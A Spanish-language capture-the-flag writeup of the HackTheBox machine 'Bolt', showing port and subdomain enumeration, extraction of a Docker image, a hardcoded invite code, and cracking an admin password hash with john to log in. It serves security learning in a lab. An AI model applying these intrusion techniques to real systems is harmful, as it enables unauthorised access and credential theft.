---
layout      : post
title       : "HackTheBox - Bolt"
author      : lanz
image       : https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bolt/384banner.png
category    : [ htb ]
tags        : [ SSTI, passbolt-secrets, cracking, code-analysis, backup ]
---
M√°quina Linux nivel medio. Vamos a jugar con im√°genes de **Docker** (para leer y leer (?)), interacciones extra√±as entre correos (SSTI), credenciales quemadas ): y secretos ü§´ del servicio **Passbolt**.

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bolt/384boltHTB.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>

## TL;DR (Spanish writeup)

**Creada por**: [d4rkpayl0ad](https://www.hackthebox.eu/profile/168546) & [TheCyberGeek](https://www.hackthebox.eu/profile/114053).

Reenviar.

Empezaremos encontrando un servicio web con una opci√≥n para descargar una imagen de **Docker**, descomprimiremos el objeto e inicialmente podremos leer varios archivos. Apoyados en la enumeraci√≥n de la imagen tendremos un objeto `.sql`, en su contenido vemos un hash, lo crackeamos. Tendremos acceso a un login-panel del servidor web como `admin`.

En el dashboard se habla de unos fallos en el c√≥digo del sitio `"demo"` yyy de unos temas relacionados con **mails**. Realizando un descubrimiento de subdominios, encontramos dos servicios relacionados con "demos" y a "mails". Tendremos que enumerar demasiado para poder generar una cuenta y pasar el login-panel de "mails". Estando dentro y jugando con la interacci√≥n entre "demos" y "mails" encontraremos una vulnerabilidad **SSTI (Server Side Template Injection)**. Esto nos permitir√° ejecutar c√≥digo remotamente para finalmente obtener una terminal como el usuario `www-data` en el sistema.

Jugando con archivos de configuraci√≥n de la app, veremos credenciales quemadas de bases de datos, haciendo reutilizaci√≥n de contrase√±as tendremos una sesi√≥n en el sistema como el usuario `eddie`.

En nuestra enumeraci√≥n inicial encontramos el servicio **Passbolt** (gestor de contrase√±as), en el sistema existen objetos relacionados con √©l. Jugaremos con bases de datos, secretos de **Passbolt**, **mails**, backups de llaves privadas y `JohnTheRipper` para finalmente desvelar lo escondido, una contrase√±a (un secreto jijiji) que nos permitir√° obtener una Shell como el usuario `root`.

...

### Clasificaci√≥n de la m√°quina seg√∫n la gentesita

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bolt/384rating.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 30%;"/>

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bolt/384statistics.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 80%;"/>

Alguito de enumeraci√≥n, movimiento de las manos y con intentos de realidad.

> La idea inicial de esta locura es tener mis "notas" por si algun d√≠a se me olvida todo (lo que es muuuy probable), leer esto y reencontrarme (o talvez no) :) La segunda idea surgio con el tiempo, ya que me di cuenta que esta es una puerta para personitas que como yo, al inicio (o simplemente a veces) nos estancamos en este mundo de la seguridad, por lo que si tengo las ganas para ayudarnos ¬øpor que no hacerlo? ... Un detalle es que si ves mucho texto, es por que me gusta mostrar tanto errores como exitos y tambien plasmar todo desde una perspectiva m√°s de ense√±anza que de solo pasos a seguir. Sin menos, muchas gracias <3 Todo lo que ves es vida!

...

Deseo concebido.

1. [Reconocimiento](#reconocimiento).
  * [Enumeraci√≥n de puertos con nmap](#enum-nmap).
2. [Enumeraci√≥n](#enumeracion).
  * [Vemos que esconde el puerto 443](#puerto-443).
  * [Le damos vueltas al puerto 80 y una imagen de **Docker**](#puerto-80).
3. [Explotaci√≥n](#explotacion).
4. [Escalada de privilegios](#escalada-de-privilegios).

...

# Reconocimiento [#](#reconocimiento) {#reconocimiento}

---

## Enumeraci√≥n de puertos con nmap [üìå](#enum-nmap) {#enum-nmap}

Empezaremos como siempre... Vamos a descubrir que puertos (servicios) tiene activos la m√°quina externamente, usaremos `nmap` para ello:

```bash
‚ù± nmap -p- --open -v 10.10.11.114 -oG portScan
```

| Par√°metro | Descripci√≥n |
| --------- | :---------- |
| -p-       | Escanea todos los 65535                      |
| --open    | Solo los puertos que est√°n abiertos          |
| -v        | Permite ver en consola lo que va encontrando |
| -oG       | Guarda el output en un archivo con formato grepeable para usar una [funci√≥n **extractPorts**](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/extractPorts.png) de [S4vitar](https://s4vitar.github.io/) que me extrae los puertos en la clipboard |

Este escaneo nos devuelve:

```bash
‚ù± cat initScan
# Nmap 7.80 scan initiated Tue Nov  9 25:25:25 2021 as: nmap -p- --open -v -oG portScan 10.10.11.114
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.10.11.114 ()	Status: Up
Host: 10.10.11.114 ()	Ports: 22/open/tcp//ssh///, 80/open/tcp//http///, 443/open/tcp//https///
# Nmap done at Tue Nov  9 25:25:25 2021 -- 1 IP address (1 host up) scanned in 92.29 seconds
```

| Puerto | Descripci√≥n |
| ------ | :---------- |
| 22     | **[SSH](https://www.hackingarticles.in/ssh-penetration-testing-port-22/)**: Tenemos la opci√≥n de generar una Shell de manera segura. |
| 80     | **[HTTP](https://searchnetworking.techtarget.com/definition/port-80)**: Nos ofrece un servidor web. |
| 443    | **[HTTPS](https://searchnetworking.techtarget.com/definition/port-80)**: Nos ofrece tambi√©n un servidor web, pero con un certificado "seguro". |

Ya que tenemos los puertos con los que cuenta la m√°quina, juguemos con el mismo `nmap` para profundizar y extraer que versiones y scripts (peque√±os c√≥digos que tiene **nmap** para validar cositas) tienen relaci√≥n con cada servicio:

**~(Usando la funci√≥n `extractPorts` (referenciada antes) podemos copiar r√°pidamente los puertos en la clipboard, as√≠ no tenemos que copiarlos a mano (en caso de que fueran muuuchos es muy √∫til)**
 
```bash
‚ù± extractPorts initScan 
[*] Extracting information...

    [*] IP Address: 10.10.11.114
    [*] Open ports: 22,80,443

[*] Ports copied to clipboard
```

**)~**

```bash
‚ù± nmap -p 22,80,443 -sC -sV 10.10.11.114 -oN portScan
```

| Par√°metro | Descripci√≥n |
| --------- | :---------- |
| -p        | Escaneo de los puertos obtenidos                       |
| -sC       | Muestra todos los scripts relacionados con el servicio |
| -sV       | Nos permite ver la versi√≥n del servicio                |
| -oN       | Guarda el output en un archivo                         |

Y este escaneo nos muestra:

```bash
‚ù± cat portScan 
# Nmap 7.80 scan initiated Tue Nov  9 25:25:25 2021 as: nmap -p 22,80,443 -sC -sV -oN portScan 10.10.11.114
Nmap scan report for 10.10.11.114
Host is up (0.18s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http     nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title:     Starter Website -  About 
443/tcp open  ssl/http nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-title: Passbolt | Open source password manager for teams
|_Requested resource was /auth/login?redirect=%2F
| ssl-cert: Subject: commonName=passbolt.bolt.htb/organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=AU
| Not valid before: 2021-02-24T19:11:23
|_Not valid after:  2022-02-24T19:11:23
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Nov  9 25:25:25 2021 -- 1 IP address (1 host up) scanned in 23.36 seconds
```

Tenemos algunas cositas relevantes:

| Puerto | Servicio | Versi√≥n |
| :----- | :------- | :------ |
| 22     | SSH      | OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 |
| 80     | HTTP     | nginx 1.18.0 |
| 443    | HTTPS    | nginx 1.18.0 |

Con este √∫ltimo puerto tenemos referencias llamativas:

* Un **password manager** al parecer...
* Una ruta hacia un posible **login**: `/auth/login`...
* Un posible **dominio**: `passbolt.bolt.htb`...
* Un nombre de una organizaci√≥n: `Internet Widgits Pty Ltd`...

Jmmm, pues bastante interesante, solo que por ahora no podemos hacer o extraer m√°s cositas de ac√°, sigamos y profundicemos.

# Enumeraci√≥n [#](#enumeracion) {#enumeracion}

---

## Veamos que esconde el puerto 443 [üìå](#puerto-443) {#puerto-443}

Veamos si el certificado `SSL` nos da info interesante:

```bash
‚ù± openssl s_client -connect 10.10.11.114:443
...
depth=0 C = AU, ST = Some-State, O = Internet Widgits Pty Ltd, CN = passbolt.bolt.htb
...
```

Volvemos a ver el subdominio `passbolt.bolt.htb`, agregu√©moslo al archivo [/etc/hosts](https://www.ionos.es/digitalguide/servidores/configuracion/archivo-hosts/) para ver que responde al conectarse a la IP `10.10.11.114`:

```bash
‚ù± cat /etc/hosts
...
10.10.11.114  bolt.htb passbolt.bolt.htb
...
```

Y en la web:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bolt/384page443.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>

Nos hace un redirect a un login en el que inicialmente debemos colocar un e-mail, peeeero antes de probar vainas. ¬øQu√© es eso de [**Passbolt**](https://www.passbolt.com/)?

üîê ***Es un gestor de contrase√±as, funciona muy simple, tienes un sitio con toooodas tus contrase√±as de tooodos los sitios, estas son manejadas y aseguradas por una contrase√±a maestra, eeeesta es la √∫nica que debemos recordar y sobre todo proteger*** (: [Passbolt, gestor de contrase√±as gratuito](https://www.genbeta.com/herramientas/passbolt-gestor-contrasenas-gratuito-codigo-libre-autoalojado-openpgp-pensado-para-equipos-trabajo).

Listos, despu√©s de probar algunos correos por default (como `admin@bolt.htb`) no logramos nada distinto a esta respuesta:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bolt/384page443_requiresInvitation.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>

As√≠ que nada, sigamos buscando usuarios o nombres para volver a este apartado.

## Recorremos los laberintos del puerto 80 [üìå](#puerto-80) {#puerto-80}

Inicialmente encontramos esta web:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bolt/384page80.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>

üìë ***Bolt is a large User Interface Kit that will help you prototype and design beautiful, creative and modern websites.***

A simple vista vemos un link hacia un `login-panel`, dando vueltas por la web podemos coleccionar nombres que probablemente nos sirvan como usuarios (como pueda que no :P):

```txt
(Apartado 1) - (Apartado 2)
Joseph Garth - Neil D. Sims
Bonnie Green - Bonnie M. Green      # Bonnie es la √∫nica que mantiene su nombre (:
 Jose Leos   - Christopher M. Wood
```

Tambi√©n encontramos un link hacia `/download` que baja un objeto llamado `image.tar`:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bolt/384page80_download_DockerImage.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>

Ah√≠ nos indica que vamos a descargar una imagen de `Docker` que ellos usan para mostrar a los clientes lo que **Bolt** (la empresa/el equipo) puede lograr... Hay una parte (`/pricing`) donde hacen preguntas y respuestas, ah√≠ tambi√©n nos aclaran que contiene la imagen:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bolt/384page80_pricing_FilesIncludedDockerImage.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>

üêã ***Una imagen Docker es un archivo, compuesto por m√∫ltiples capas, que se utiliza para ejecutar c√≥digo <u>en un contenedor Docker</u>. Estas im√°genes son las plantillas base desde la que partimos ya sea para crear una nueva imagen o crear nuevos contenedores para ejecutar las aplicaciones.***

üê≥ ***<u>Las im√°genes se emplean para generar contenedores, ya que estas nunca van a cambiar</u>, esto permite crear contenedores con diferentes capas de im√°genes las cuales se van a superponer sobre otras.*** [¬øQu√© es una imagen en Docker?](http://codigoelectronica.com/blog/que-es-una-imagen-en-docker)

Bien, pues descarguemos el objeto y veamos como jugar con √©l (:

```bash
‚ù± file image.tar 
image.tar: POSIX tar archive
```

Podemos hacer dos cosas, descomprimir el archivo y recorrer sus objetos ooooooo montar directamente la imagen con `Docker` e interactuar con ella. Hagamos r√°pidamente las dos, primero montemos la imagen con **Docker**... 

üí£ <u>Montamos imagen</u> (archivo `image.tar`) <u>en </u>**<u>Docker</u>**...

Pero ¬ømontar una imagen **Docker** usando √∫nicamente un archivo `.tar`? Sip, mira:

* [Load an image from a tar archive or STDIN](https://docs.docker.com/engine/reference/commandline/image_load/).

√önicamente ejecutamos:

```bash
‚ù± docker image load -i image.tar
Loaded image: flask-dashboard-adminlte_appseed-app:latest
```

Listos, ya estar√≠a cargada, para validar que im√°genes tenemos ejecutamos:

```bash
‚ù± docker images
REPOSITORY                             TAG                 IMAGE ID            CREATED             SIZE
flask-dashboard-adminlte_appseed-app   latest              859e74798e6c        9 months ago        154MB
```

Perfecto, ya esta montada, lo √∫nico que falta es ejecutarla y generar un **contenedor** con el que podremos interactuar, para ello hacemos:

```bash
‚ù± docker run flask-dashboard-adminlte_appseed-app
...
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bolt/384bash_docker_RUNimageTAR.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>

Peeeeeerfecto, se nos tuvo que haber generado un **contenedor**, listemos y validamos de una vez:

```bash
‚ù± docker ps
CONTAINER ID        IMAGE                                  COMMAND                  CREATED             STATUS              PORTS               NAMES
a1a22a4483da        flask-dashboard-adminlte_appseed-app   "gunicorn --config g‚Ä¶"   4 minutes ago       Up 3 minutes        5005/tcp            keen_hugle
```

Efectivamente, tenemos el contenedor funcional, intentemos entrar en √©l ejecutando una `Shell`, as√≠ estar√≠amos movi√©ndonos entre los objetos que componen la imagen (:

```bash
‚ù± docker exec -it keen_hugle /bin/sh
```

Lo que hacemos es ejecutar en el contenedor llamado `keen_hugle` (este nombre sale del output de arriba), de manera interactiva (`-i`) y consiguiendo una TTY para movernos entre comandos, hacer **CTRL+C** y tener hist√≥rico (`-t`) una **Shell** (`/bin/sh`), como resultado tenemos:

```bash
‚ù± docker exec -it keen_hugle /bin/sh
/ # hostname
a1a22a4483da
```

Y listo, ahora si tenemos acceso a los archivos de la imagen y a la ra√≠z del contenedor:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bolt/384bash_docker_SHELL_lsROOTsystem.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>

Dando algunas vueltas encontramos cositas llamativas:

```bash
root@a1a22a4483da:/$ cat config.py 
...
    # Set up the App SECRET_KEY
    SECRET_KEY = config('SECRET_KEY', default='S#perS3crEt_007')
    ...
    # This will create a file in <app> FOLDER
    SQLALCHEMY_DATABASE_URI = 'sqlite:///' + os.path.join(basedir, 'db.sqlite3')
    ...
    DEFAULT_MAIL_SENDER = 'support@bolt.htb'
    ...
...
```

* Una llave secreta, la guardamos por si algo.
* Hace el llamado a un archivo llamado `db.sqlite3`, tambi√©n puede ser interesante encontrarlo.
* Tenemos un correo con una referencia al dominio `bolt.htb`.

Como vimos arriba y en el c√≥digo, hay una carpeta llamada `app` y suponemos que hay esta toooda la estructura de la web (la que nos entregan en `image.tar`).

Recorriendo sus objetos no encontramos nada llamativo y jugando con `find` tampoco encontramos el archivo `db.sqlite3`, pues nada, rompamos el comprimido a ver si hay algo distinto a lo encontrado (:

üí£ <u>Descomprimimos objeto y leemos su contenido</u>...

Ejecutamos:

```bash
‚ù± tar xvf image.tar
```

* `x`, para extraer.
* `v`, para tener traza visual de lo que va pasando (verbose).
* `f`, le pasamos el archivo a descomprimir.

Obtenemos estos archivos:

> Si queremos evitar mostrar la fecha y hora: [**ls command without (hiding) date and time**](https://unix.stackexchange.com/questions/344088/ls-command-without-hiding-date-and-time)

```bash
‚ù± ls -lhago --time-style=+""
total 12K
drwxr-xr-x 1 1,6K  .
drwxr-xr-x 1  468  ..
drwxr-xr-x 1   40  187e74706bdc9cb3f44dca230ac7c9962288a5b8bd579c47a36abf64f35c2950
drwxr-xr-x 1   40  1be1cefeda09a601dd9baa310a3704d6309dc28f6d213867911cd2257b95677c
drwxr-xr-x 1   40  2265c5097f0b290a53b7556fd5d721ffad8a4921bfc2a6e378c04859185d27fa
drwxr-xr-x 1   40  3049862d975f250783ddb4ea0e9cb359578da4a06bf84f05a7ea69ad8d508dab
drwxr-xr-x 1   40  3350815d3bdf21771408f91da4551ca6f4e82edce74e9352ed75c2e8a5e68162
drwxr-xr-x 1   40  3d7e9c6869c056cdffaace812b4ec198267e26e03e9be25ed81fe92ad6130c6b
drwxr-xr-x 1   40  41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad
drwxr-xr-x 1   40  745959c3a65c3899f9e1a5319ee5500f199e0cadf8d487b92e2f297441f8c5cf
-rw-r--r-- 1 3,8K  859e74798e6c82d5191cd0deaae8c124504052faa654d6691c21577a8fa50811.json
drwxr-xr-x 1   40  9a3bb655a4d35896e951f1528578693762650f76d7fb3aa791ac8eec9f14bc77
drwxr-xr-x 1   40  a4ea7da8de7bfbf327b56b0cb794aed9a8487d31e588b75029f6b527af2976f2
drwxr-xr-x 1   40  d693a85325229cdf0fecd248731c346edbc4e02b0c6321e256ffc588a3e6cb26
-rw-r--r-- 1 1002  manifest.json
-rw-r--r-- 1  119  repositories
```

Uff, bastantes directorios... 

Si hacemos un "√°rbol" de objetos, encontramos que todos tienen esta estructura:

```bash
‚ù± tree .
.
‚îú‚îÄ‚îÄ 187e74706bdc9cb3f44dca230ac7c9962288a5b8bd579c47a36abf64f35c2950
‚îÇ¬†¬† ‚îú‚îÄ‚îÄ json
‚îÇ¬†¬† ‚îú‚îÄ‚îÄ layer.tar
‚îÇ¬†¬† ‚îî‚îÄ‚îÄ VERSION
‚îú‚îÄ‚îÄ 1be1cefeda09a601dd9baa310a3704d6309dc28f6d213867911cd2257b95677c
‚îÇ¬†¬† ‚îú‚îÄ‚îÄ json
‚îÇ¬†¬† ‚îú‚îÄ‚îÄ layer.tar
‚îÇ¬†¬† ‚îî‚îÄ‚îÄ VERSION
‚îú‚îÄ‚îÄ 2265c5097f0b290a53b7556fd5d721ffad8a4921bfc2a6e378c04859185d27fa
‚îÇ¬†¬† ‚îú‚îÄ‚îÄ json
‚îÇ¬†¬† ‚îú‚îÄ‚îÄ layer.tar
‚îÇ¬†¬† ‚îî‚îÄ‚îÄ VERSION
...
```

Tienen un comprimido dentro, para evitar descomprimir manualmente cada objeto podemos jugar con un script que entre en cada carpeta y juegue con el objeto `layer.tar`, quedar√≠a as√≠:

* [decom.sh](https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/bolt/decom.sh)

> Entonces apoyados en el script podemos descomprimir el objeto `image.tar` y leer los comprimidos de cada directorio (`layer.tar`) (:

Recorriendo cada directorio encontramos varias cositas interesantes, una de ellas es el c√≥digo fuente del servidor web y una parte interesante:

```bash
‚ù± cat 41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad/app/base/routes.py
```

```py
...
## Login & Registration
...
@blueprint.route('/register', methods=['GET', 'POST'])
def register():
    login_form = LoginForm(request.form)
    create_account_form = CreateAccountForm(request.form)
    if 'register' in request.form:

        username  = request.form['username']
        email     = request.form['email'   ]
        code      = request.form['invite_code']
        if code != 'XNSS-HSJW-3NGU-8XTJ':
            return render_template('code-500.html')
        data = User.query.filter_by(email=email).first()
        if data is None and code == 'XNSS-HSJW-3NGU-8XTJ':
            # Check usename exists
            user = User.query.filter_by(username=username).first()
            if user:
                ...
            ...
        ...
    ...
...
```

Hay un c√≥digo de invitaci√≥n, que seg√∫n leemos es necesario para la creaci√≥n de una cuenta en el sitio, interesante, nos podr√≠a servir como contrase√±a o como lo que es, un c√≥digo de invitaci√≥n para alguna parte donde nos lo pida :P

Algo que tambi√©n encontr√© entre los objetos fue este archivo `.sqlite3`:

```bash
‚ù± find . | grep "\.sql"
...
./a4ea7da8de7bfbf327b56b0cb794aed9a8487d31e588b75029f6b527af2976f2/db.sqlite3
```

Si lo abrimos tenemos:

```bash
‚ù± file ./a4ea7da8de7bfbf327b56b0cb794aed9a8487d31e588b75029f6b527af2976f2/db.sqlite3
./a4ea7da8de7bfbf327b56b0cb794aed9a8487d31e588b75029f6b527af2976f2/db.sqlite3: SQLite 3.x database, last written using SQLite version 3025003
```

```bash
‚ù± strings ./a4ea7da8de7bfbf327b56b0cb794aed9a8487d31e588b75029f6b527af2976f2/db.sqlite3
SQLite format 3
9tableUserUser
CREATE TABLE "User" (
        id INTEGER NOT NULL, 
        username VARCHAR, 
        email VARCHAR, 
        password BLOB, 
        email_confirmed BOOLEAN, 
        profile_update VARCHAR(80), 
        PRIMARY KEY (id), 
        UNIQUE (username), 
        UNIQUE (email)
indexsqlite_autoindex_User_2User
indexsqlite_autoindex_User_1User
adminadmin@bolt.htb$1$sm1RceCh$rSd3PygnS/6jlFDfF2J5q.
        admin
)       admin@bolt.htb
```

Claramente, es la estructura de una base de datos, peeeeeeeeeeeero si nos fijamos detenidamente, al final tenemos datos de un usuario llamado `admin`:

| Campo | Valor |
| :---- | :---- |
| username | admin |
| email    | admin@bolt.htb |
| password | $1$sm1RceCh$rSd3PygnS/6jlFDfF2J5q. |

Opa, hay una contrase√±a hasheada, probemos a crackearla, quiz√°s perdemos el tiempo, quiz√°s no :P Guardamos el hash en un archivo y con ayuda de `john` jugamos:

```bash
‚ù± cat admin-sqlite3.hash 
$1$sm1RceCh$rSd3PygnS/6jlFDfF2J5q.
```

```bash
‚ù± john --wordlist=/usr/share/wordlists/rockyou.txt admin-sqlite3.hash 
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
Press 'q' or Ctrl-C to abort, almost any other key for status
deadbolt         (?)
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

SI SE√ëOOOOOOOOOOOOOOOOOOR! Tenemos la contrase√±a en texto plano, as√≠ que contamos con credenciales a probar en todos los lados que podamos...

Recuerdan por aaaaaall√° arriba que hab√≠amos mencionado un login-panel en `http://bolt.htb/login`? Pues juguemos con las creds en ese login:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bolt/384page80_loginWITHadmin.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>

Enviamos yyyyyyyyyyYYy:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bolt/384page80_dashboardASadmin.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>

SON VALIDAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAS! Me gusta (: Ahora revisemos a ver que encontramos...

Bajando un poco vemos una conversaci√≥n con `Sarah Bullock` de la cual podemos extraer bastante info:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bolt/384page80_dashboardASadmin_conversationWITHsarah.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>

* Posibles usuarios: **Alexander Pierce**, **Eddie** y **Sarah Bullock**.
* Hay un problema de seguridad relacionado con el apartado `e-mail` (interesante).
* El acceso a la `demo` es √∫nicamente con invitaci√≥n (as√≠ que la que tiene el problema es la `demo`).

Bien, bastante llamativo... Debajo de la conversaci√≥n tenemos una lista de cosas por hacer:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bolt/384page80_dashboardASadmin_TOdoLIST.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>

Vemos que no se ha corregido un problema en el c√≥digo (probablemente relacionado con el tema de seguridad) yyyy que implementaron el cliente de correo [Roundcube](https://es.wikipedia.org/wiki/Roundcube) (tambi√©n podemos relacionarlo con lo de arriba, ya que mencionan que el problema se encuentra en temas de "email"), as√≠ que nos resta buscar, buscar y buuuuscar cositas enfocadas en **mails** (:

Recorriendo la web perdemos mucho tiempo, porque no encontramos nada √∫til, ac√° estuve un tiempo perdido, record√© y me hab√≠a faltado algo esencial de la enumeraci√≥n

...

Podemos intentar descubrir posibles subdominios (quiz√°s nuevos servicios web). Jugando con `wfuzz` logramos hacerlo, √∫nicamente le indicamos:

* El wordlist (la lista de subdominios).
* Algunas excepciones:
  * `--hc`: Para evitar que nos muestre las respuestas con alg√∫n status code especifico
* El host al que estamos apuntando.
* Y la cabecera `host` que ser√° la encargada de validar si alg√∫n subdominio (ejemplo: `hola.bolt.htb`) le da un c√≥digo de estado distinto a `404`.

Quedar√≠a y responder√≠a as√≠:

```bash
‚ù± wfuzz -c --hc=404 -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u http://10.10.11.114 -H 'Host: FUZZ.bolt.htb'                                                  
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.11.114/
Total requests: 114441

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000001:   200        504 L    1801 W     30341 Ch    "www"
000000003:   200        504 L    1801 W     30341 Ch    "ftp"
000000007:   200        504 L    1801 W     30341 Ch    "webdisk"
000000015:   200        504 L    1801 W     30341 Ch    "ns"
000000030:   200        504 L    1801 W     30341 Ch    "new"
000000031:   200        504 L    1801 W     30341 Ch    "mobile"
000000029:   200        504 L    1801 W     30341 Ch    "old"
000000028:   200        504 L    1801 W     30341 Ch    "imap"
000000027:   200        504 L    1801 W     30341 Ch    "mx"
...
```

Vemos que nos da muuuchos falsos positivos, as√≠ que para evitarlo le agregamos la excepci√≥n `--hw` para que seg√∫n el valor de la columna **Word** no nos muestre resultados con X numero asignado...

Nosotros tenemos `1801`, pues ese ser√° el n√∫mero asignado, por lo tanto, evitara mostrarnos resultados con ese numero de palabras (:

```bash
‚ù± wfuzz -c --hc=404 --hw=1801 -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u http://10.10.11.114 -H 'Host: FUZZ.bolt.htb'
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.11.114/
Total requests: 114441

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                      
=====================================================================

000000002:   200        98 L     322 W      4943 Ch     "mail"                                                                                                                       
000000038:   302        3 L      24 W       219 Ch      "demo"
...
```

Tenemos dos resultados distintos, o sea, dos posibles subdominios, solo nos queda probarlos a ver si nos dan respuesta:

<u>mail.bolt.htb</u>

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bolt/384page80_mail_login.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>

OPAAAAAA, un login-panel, validemos ahora el otro subdominio:

<u>demo.bolt.htb</u>

> **Tengamos en cuenta que en la conversaci√≥n con <u>Sarah</u> hablaban de la version `demo` YYYYYYyyyY tenemos un subdominio que apunta al parecer a una versi√≥n `demo`... Adem√°s, la vuln esta relacionada con <u>mails</u> yyyyyYYYY tenemos un subdominio que juega con `mails`, as√≠ que ojito ojitooooo...**

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bolt/384page80_demo_login.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>

Y tambi√©n es funcional (: As√≠ que ahora tenemos dos nuevos caminos a probar, d√©mosle...

...

Con `mail.bolt.htb` no llegamos a ning√∫n lado, ni jugando con credenciales por default, ni investigando versiones vulnerables, nada...

Como vimos, el login-panel de `demo.bolt.htb` claramente nos pide credenciales:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bolt/384page80_demo_login.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>

Pero en la parte de abajo nos invita a crearnos una cuenta en caso de que no la tengamos, procedamos:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bolt/384page80_demo_register.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>

Al ir llenando cada campo llegamos a uno bastante curioso: **Invite code**, si colocamos algo random e intentamos registrarnos nos muestra esto:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bolt/384page80_demo_invalid_inviteCode.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>

PEEEEEEEEEEEERO, recuerden... ¬øYa recordaron? Efectivamente, en nuestra enumeraci√≥n de la imagen de **Docker** (comprimido `.tar` y sus objetos) hab√≠amos encontrado el c√≥digo fuente de una aplicaci√≥n, en esa fuente la ruta `/register` yyy lo curioso de esa porci√≥n de c√≥digo es que hace una validaci√≥n entre un input y un c√≥digo de invitaci√≥n en texto plano:

```bash
‚ù± cat 41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad/app/base/routes.py
```

```py
...
        username  = request.form['username']
        email     = request.form['email'   ]
        code      = request.form['invite_code']
        if code != 'XNSS-HSJW-3NGU-8XTJ':
            return render_template('code-500.html')
        data = User.query.filter_by(email=email).first()
        if data is None and code == 'XNSS-HSJW-3NGU-8XTJ':
            # Check usename exists
            ...
...
```

Podr√≠amos probar ese c√≥digo en este formulario, ¬øno? ... Pues al llenar los campos y dar click en `Create Account` no obtenemos el error de arriba, por el contrario, somos redirigidos al apartado `/login`, as√≠ que validemos las credenciales que registramos :P

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bolt/384page80_demo_adminProfile.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>

PEEEEEEERFECTO, todo perfecto (:

